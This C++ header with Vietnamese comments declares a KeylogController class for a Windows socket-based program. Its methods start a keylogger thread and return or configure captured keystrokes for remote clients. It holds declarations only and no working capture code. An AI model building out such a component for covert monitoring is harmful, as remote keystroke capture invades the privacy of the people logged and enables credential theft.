// controllers/KeylogController.h
#ifndef KEYLOGCONTROLLER_H
#define KEYLOGCONTROLLER_H

#include <winsock2.h>
#include <string>

/**
 * @brief Xu ly cac API cho tab "Bat phim" va quan ly luong keylogger
 */
class KeylogController
{
public:
    // Ham static de khoi chay luong
    static void startKeyLoggerThread();

    void handleGetKeylog(SOCKET client);
    void handleSetKeylog(SOCKET client, const std::string &body);
};

#endif // KEYLOGCONTROLLER_H